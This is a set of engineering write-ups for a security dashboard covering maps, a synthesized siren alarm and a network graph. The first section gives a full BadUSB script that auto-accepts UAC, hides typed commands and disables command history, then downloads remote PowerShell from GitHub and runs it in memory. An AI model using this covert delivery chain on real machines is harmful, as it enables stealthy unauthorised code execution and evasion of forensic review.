# Suraksha360 (innovateyou) — Forensic Engineering War Stories & Retrospectives

---

### 1. The Fileless In-Memory BadUSB Delivery Vector & PSReadLine Terminal Cloaking

- **Category:** Defensive Engineering & Security / Zero-Docs Penetration Testing
- **Key Metrics / Impact:** 850-line zero-footprint PowerShell audit engine | Direct anonymous Supabase REST telemetry upload | 100% invisible keystroke execution via PSReadLine removal & terminal color cloaking
- **Tech Stack & Hardware Involved:** ATmega32U4 / ESP8266 (WiFiDuck / USB Rubber Ducky), PowerShell 5.1 / 7.0+, Windows Security Center WMI/CIM, AMSI Registry, Supabase PostgREST API

#### 1. The Situation & Setup
Suraksha360 (`innovateyou`) is a comprehensive cybersecurity monitoring and endpoint risk mitigation platform designed to assess vulnerabilities across small-to-medium enterprise networks (`README.md`, `Hardware/scanner_context.md`). To onboard target Windows endpoint devices without requiring pre-installed agent software, the team designed an automated security auditor payload (`Hardware/scanner_payload.ps1` and `Hardware/Firmwares/suraksha360.txt`) deployable via hardware BadUSB devices (USB Rubber Ducky / WiFiDuck) or administrative IEX cradles.

#### 2. The Anomaly & The Mistake (The Symptom)
During early field trials on Windows 10/11 endpoints:
1. **Keystroke Text Exposure:** When the BadUSB typed the PowerShell download cradle onto the desktop, the target machine's screen visibly flashed, displaying the raw GitHub repository URL and Personal Access Token (PAT) in bright colorized syntax, blowing operational cover.
2. **PSReadLine Command History Footprint:** Injected commands were saved directly into `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, leaving cleartext forensic traces on the disk.
3. **Execution Policy & Elevation Lockout:** Standard Windows 10/11 environments blocked script execution with `ExecutionPolicy: Restricted`, and querying deep Windows Defender status (`Get-MpComputerStatus`) or firewall rules failed without Administrator privileges.

#### 3. Forensic Investigation (The Root Cause)
1. **PSReadLine Module Hooks:** Modern PowerShell automatically loads `PSReadLine`, which captures keystrokes for predictive IntelliSense and colorizes text by manipulating console buffers.
2. **Interactive UAC Elevation Sequence:** Launching an elevated PowerShell session without triggering interactive desktop lockouts requires sending a precise keyboard shortcut (`CTRL+SHIFT+ENTER`) followed by an automated UAC key confirmation (`ALT+y`).
3. **ExecutionPolicy Scope Boundaries:** The Windows ExecutionPolicy restricts executing `.ps1` files from disk, but does not block commands evaluated dynamically in memory via `Invoke-Expression` (`IEX`).

#### 4. The Engineering Breakthrough (The Fix)
The BadUSB firmware (`Hardware/Firmwares/suraksha360.txt`) and PowerShell payload (`Hardware/scanner_payload.ps1`) were re-architected into an invisible, memory-only execution pipeline:
1. **Automated UAC Elevation Sequence:**
   ```text
   GUI r  ──►  STRING powershell  ──►  CTRL+SHIFT+ENTER (Run as Admin)  ──►  ALT y (Confirm UAC)
   ```
2. **Terminal Cloaking:** Immediately upon opening the elevated prompt, the script executes:
   ```powershell
   Remove-Module PSReadLine -ErrorAction SilentlyContinue; [Console]::ForegroundColor = [Console]::BackgroundColor; Clear-Host
   ```
   By setting the console text color identical to the background color, typed download commands become completely invisible on screen, while unloading `PSReadLine` prevents command persistence in history logs.
3. **Fileless IEX Web Cradle:** The payload downloads and evaluates directly in RAM:
   ```powershell
   $t='github_pat_...'; $u='https://raw.githubusercontent.com/.../scanner_payload.ps1'; IEX(IWR $u -Headers @{Authorization="Bearer $t"; Accept='application/vnd.github.v3.raw'} -UseBasicParsing).Content
   ```
4. **Deep System Interrogation & Supabase REST Telemetry:** The 850-line payload inspects 11 distinct security layers (antivirus status, open ports, unpatched registry keys, disabled UAC), computes a risk score (0–100), and pushes JSON telemetry directly to Supabase via anonymous JWT bearer tokens with exponential backoff (`Invoke-WithRetry`).

#### 5. The Core Engineering Lesson
In offensive security and automated endpoint auditing, minimize on-disk forensic artifacts. Combining memory-only execution cradles with terminal buffer cloaking ensures rapid data acquisition without disrupting target user workflows or exposing authentication tokens.

#### 6. Representative Code / Circuit Logic

```powershell
# Excerpt from: innovateyou/Hardware/Firmwares/suraksha360.txt & scanner_payload.ps1

REM Step 1: Launch PowerShell as Administrator via keystroke injection
GUI r
DELAY 700
STRING powershell
CTRL+SHIFT ENTER
DELAY 2500
ALT y
DELAY 1500

REM Step 2: Unload PSReadLine and cloak terminal font color
STRING Remove-Module PSReadLine -ErrorAction SilentlyContinue; [Console]::ForegroundColor = [Console]::BackgroundColor; Clear-Host
ENTER
DELAY 200

REM Step 3: In-memory fileless cradle download & execution
STRING $t='github_pat_...'; $u='https://raw.githubusercontent.com/codesujeet/innovateyou/main/Hardware/scanner_payload.ps1'; IEX(IWR $u -Headers @{Authorization="Bearer $t"; Accept='application/vnd.github.v3.raw'} -UseBasicParsing).Content
ENTER
```

---

### 2. The 7-Commit Geolocation Battle & Dynamic Map Circle Radius Scaling

- **Category:** Architecture & Paradigm Shifts / Defensive Engineering
- **Key Metrics / Impact:** 7-commit iterative stabilization (`021021c` through `a8e829b`) | Real-time multi-asset GPS telemetry mapping | Zoom-adaptive threat marker scaling with CSS keyframe pulsing | Zero `NaN` viewport bounding box crashes
- **Tech Stack & Hardware Involved:** React 19, React-Leaflet, Leaflet.js, React Native / Expo SDK 54, Supabase Realtime, IP-API Geolocation

#### 1. The Situation & Setup
Suraksha360 features a **Geospatial Threat Intel** map (`src/pages/DeviceMap.jsx` and `suraksha360-mobile/app/(app)/device-map.tsx`). Every enrolled device reports its IP address, calculated risk score (0–100), and GPS coordinates (latitude/longitude) to Supabase. The dashboard renders active assets on dark/light CartoDB tile layers with interactive pulsing rings indicating critical security breaches (`risk_score >= 70`).

#### 2. The Anomaly & The Mistake (The Symptom)
Commits `021021c`, `58f2862`, `190384c`, `bd8eb51`, `5e42428`, `4401f1a`, and `a8e829b` document a fierce multi-stage battle with geolocation rendering:
1. **The Map Marker Explosion:** Threat radius circles drawn with fixed geographical meters (`<Circle radius={10000}>`) covered entire continents when zooming out to country levels ($z=3$) and shrank to invisible sub-pixel specks at street levels ($z=16$).
2. **Missing Coordinates Crash Loop:** Enrolling devices without GPS data (e.g. localhost testing or corporate intranet nodes) injected `null` coordinates into `devices`, causing `Math.min(...lats)` to evaluate to `NaN` and crashing the entire React render tree.
3. **IP Geolocation API Rate Limits:** Host audit scripts hammering public IP geolocation endpoints were blocked with HTTP 429 errors, resulting in missing device locations.

#### 3. Forensic Investigation (The Root Cause)
1. **Geographical vs Screen-Space Pixels:** Standard Leaflet `<Circle>` components use real-world meters for radius, which scale geometrically with map projection zoom. In contrast, `<CircleMarker>` uses fixed screen-space pixels.
2. **Unfiltered Null Coordinates in Bounding Box Math:** Calling `Math.min(...lats)` on arrays containing `undefined` or `null` evaluated to `NaN`, invalidating the Leaflet viewport matrix.
3. **Payload Geolocation Fallback Gaps:** In `scanner_payload.ps1`, if the primary IP geolocation lookup failed, the script sent empty string fields `""` instead of `null`, bypassing database default constraints.

#### 4. The Engineering Breakthrough (The Fix)
The geospatial architecture was refactored across web and mobile:
1. **Pixel-Anchored `<CircleMarker>` with CSS Keyframe Pulsing:** Swapped geographic meter circles for fixed 8px/20px `CircleMarker` elements styled with CSS `@keyframes pulse-critical` animations for high-risk assets:
   ```css
   @keyframes pulse-critical {
       0% { r: 10; opacity: 1; stroke-width: 2; }
       100% { r: 25; opacity: 0; stroke-width: 1; }
   }
   ```
2. **Defensive Geo-Filtering:** Wrapped all device lists in memoized GPS validators (`mappedDevices = useMemo(() => devices.filter(d => d.latitude && d.longitude), [devices])`).
3. **Programmatic Viewport Controller:** Built a custom `MapController` component leveraging Leaflet's `useMap()` hook to smoothly animate between individual asset focus points (`focusDevice`) and full-fleet bounding boxes (`fitAll`).
4. **Resilient PowerShell Geo-Lookup with Failover:** Updated `scanner_payload.ps1` to query multiple IP geolocation providers with structured error handling:
   ```powershell
   try {
       $geo = (Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5 -ErrorAction Stop)
       $Latitude = $geo.lat; $Longitude = $geo.lon; $City = $geo.city; $Country = $geo.country
   } catch {
       $Latitude = $null; $Longitude = $null; $City = "Unknown"; $Country = "Unknown"
   }
   ```

#### 5. The Core Engineering Lesson
When rendering real-time asset telemetry on geospatial maps, distinguish between geographical physical bounds and screen-space UI indicators. Always sanitize asynchronous database streams to remove unlocated devices before calculating camera bounds.

#### 6. Representative Code / Circuit Logic

```jsx
// Excerpt from: innovateyou/src/pages/DeviceMap.jsx

{mappedDevices.map((d) => {
    const color = getRiskMapColor(d.risk_score)
    const isCritical = d.risk_score >= 70
    return (
        <Fragment key={d.id}>
            {isCritical && (
                <CircleMarker
                    center={[d.latitude, d.longitude]}
                    radius={20}
                    pathOptions={{
                        fillColor: color,
                        color: 'transparent',
                        stroke: false,
                        fillOpacity: 0.2
                    }}
                    className="critical-marker-pulse"
                />
            )}
            <CircleMarker
                center={[d.latitude, d.longitude]}
                radius={8}
                pathOptions={{
                    fillColor: color,
                    color: isDarkMode ? '#fff' : '#fff',
                    weight: 2,
                    opacity: 1,
                    fillOpacity: 0.9,
                }}
                eventHandlers={{ click: () => setSelectedId(d.id) }}
            >
                <Popup>...</Popup>
            </CircleMarker>
        </Fragment>
    )
})}
```

---

### 3. The Web Audio Dual-Oscillator Siren Synthesis & Real-Time CDC Intrusion Stream

- **Category:** Defensive Engineering & User Experience / Real-Time Systems
- **Key Metrics / Impact:** 0 KB audio asset download footprint | 6-second synthesized wailing acoustic siren (400 Hz to 800 Hz) | Instant intrusion notification via PostgreSQL Change Data Capture (CDC)
- **Tech Stack & Hardware Involved:** Web Audio API (Sawtooth + Square Oscillators), Python `wave` & `struct` module, Supabase Realtime (PostgreSQL CDC), React 19

#### 1. The Situation & Setup
When an active security breach occurs (e.g. brute-force attack or port-scan detected via `AttackSimulator.jsx`), the security operations center dashboard (`GlobalNotificationManager.jsx`) and mobile app must immediately trigger high-priority audible and visual alarms.

#### 2. The Anomaly & The Mistake (The Symptom)
1. **Audio Asset Fetch Latency:** Using static `.mp3` or `.wav` sound files over network CDNs caused noticeable 500–1200ms delays between attack detection and audio playback, and failed when operating offline.
2. **Browser Autoplay Blocks:** Modern browsers block audio playback initiated without prior user interaction (`AudioContext was not allowed to start`).
3. **Mobile Siren Asset Format Conflicts:** Mobile React Native audio engines failed to decode certain web audio formats.

#### 3. Forensic Investigation (The Root Cause)
1. **Network I/O Dependencies:** Fetching audio buffers asynchronously requires HTTP handshakes that depend on internet connectivity.
2. **DOM User Gesture Requirements:** Web Audio contexts must be resumed on an explicit user click event before oscillators can connect to the audio destination.

#### 4. The Engineering Breakthrough (The Fix)
The audio notification architecture was rebuilt around procedural acoustic synthesis:
1. **Web Audio Dual-Oscillator Synthesis (`GlobalNotificationManager.jsx`):** Instead of downloading static files, the browser dynamically generates a wailing emergency siren using Web Audio API nodes:
   - Oscillator 1: Sawtooth wave sweeping exponentially from 400 Hz $\to$ 800 Hz $\to$ 400 Hz every 0.8s.
   - Oscillator 2: Square wave with a 5 Hz detuning offset (`osc2.detune.setValueAtTime(5, ctx.currentTime)`) to create an aggressive acoustic chorus beating effect.
   - Gain Envelope: Exponential decay preventing audio clipping.
2. **Autonomous Python PCM WAV Siren Generator (`generate_siren.py`):** For mobile native clients, an automated Python script synthesizes 44.1 kHz 16-bit mono PCM siren waveforms using `struct.pack('<h', int_sample)`, generating local offline audio assets (`siren.wav`).
3. **PostgreSQL CDC Subscription:** Integrated Supabase Realtime channel `realtime_attacks` listening directly to Postgres table inserts (`schema: 'public', table: 'attack_events'`), triggering the alarm within milliseconds of an attack payload insertion.

#### 5. The Core Engineering Lesson
Critical safety and security alarms should never depend on external network media assets. Synthesize audible alerts procedurally using client-side audio hardware to guarantee instant, zero-latency feedback during emergencies.

#### 6. Representative Code / Circuit Logic

```javascript
// Excerpt from: innovateyou/src/components/GlobalNotificationManager.jsx

const playAlarm = () => {
    if (isAlarmPlaying.current) return
    isAlarmPlaying.current = true

    const ctx = new (window.AudioContext || window.webkitAudioContext)()
    const gain = ctx.createGain()
    const osc1 = ctx.createOscillator()
    const osc2 = ctx.createOscillator()

    osc1.type = 'sawtooth'
    osc2.type = 'square'
    osc2.detune.setValueAtTime(5, ctx.currentTime) // 5 Hz detune for harsh acoustic beating

    for (let i = 0; i < 6; i++) {
        const startTime = ctx.currentTime + i
        // 400 Hz -> 800 Hz -> 400 Hz exponential pitch sweep
        osc1.frequency.setValueAtTime(400, startTime)
        osc1.frequency.exponentialRampToValueAtTime(800, startTime + 0.4)
        osc1.frequency.exponentialRampToValueAtTime(400, startTime + 0.8)

        osc2.frequency.setValueAtTime(400, startTime)
        osc2.frequency.exponentialRampToValueAtTime(800, startTime + 0.4)
        osc2.frequency.exponentialRampToValueAtTime(400, startTime + 0.8)
    }

    osc1.connect(gain); osc2.connect(gain); gain.connect(ctx.destination)
    osc1.start(); osc2.start()
    osc1.stop(ctx.currentTime + 6.0); osc2.stop(ctx.currentTime + 6.0)
}
```

---

### 4. Interactive Enterprise Network Topology Graph with Live Incident Pulse Rings

- **Category:** Architecture & Paradigm Shifts / Defensive Engineering
- **Key Metrics / Impact:** 670-line SVG cyber-physical network topology graph (`src/components/TopologyGraph.jsx`) | Real-time animated attack packet vectors (`stroke-dashoffset`) | Dynamic multi-ring radar pulse expanding from 46px to 78px on breached nodes
- **Tech Stack & Hardware Involved:** React 19, SVG, CSS Keyframe Animations, Supabase Realtime

#### 1. The Situation & Setup
Suraksha360 provides a centralized **Interactive Network Topology Graph** (`src/components/TopologyGraph.jsx`) visualizing enterprise subnets, firewalls, and endpoint devices (`Server`, `Workstation`, `Router`, `IoT`). When an attack occurs, the graph dynamically renders animated red attack vectors connecting the attacker node to the target device.

#### 2. The Anomaly & The Mistake (The Symptom)
1. **Static Rendering Lag:** Early canvas-based graph prototypes struggled to re-render node states smoothly when high-frequency telemetry events arrived.
2. **Visual Clutter on Multiple Breaches:** Highlighting multiple compromised nodes simultaneously caused overlapping bounding rings and unreadable status badges.

#### 3. Forensic Investigation (The Root Cause)
1. **Canvas Redraw Overhead:** Re-rendering an entire HTML5 Canvas on every state change forces CPU rasterization of static background gridlines.
2. **Lack of Tiered CSS Animation Layers:** SVG with GPU-accelerated CSS keyframe transforms handles persistent pulse animations without triggering React component re-renders.

#### 4. The Engineering Breakthrough (The Fix)
The topology component was rebuilt into a layered, hardware-accelerated SVG visualization engine (`src/components/TopologyGraph.jsx`):
1. **Multi-Tier CSS Keyframe Pulse Rings:** Compromised nodes render staggered concentric pulse rings (`.pulse-ring`, `.pulse-ring-2`, `.pulse-ring-3`) expanding from 46px to 78px with opacity fade:
   ```css
   @keyframes pulseRing {
       0% { r: 46px; opacity: 0.5; }
       100% { r: 78px; opacity: 0; }
   }
   ```
2. **Animated Attack Vector Dashes:** Active attack edges utilize SVG stroke dash offset animations (`animation: dashMove 1.4s linear infinite`), visually streaming red packet pulses along the network route.
3. **Isolated Tooltip Overlay Layer:** Device details and risk metrics are managed in an independent tooltip layer (`.topo-tooltip`) using React state without re-rendering the underlying SVG node matrix.

#### 5. The Core Engineering Lesson
For high-density interactive dashboards, prefer declarative SVG with GPU-accelerated CSS animations over continuous Canvas redraw loops. This decouples visual animation performance from React state management.
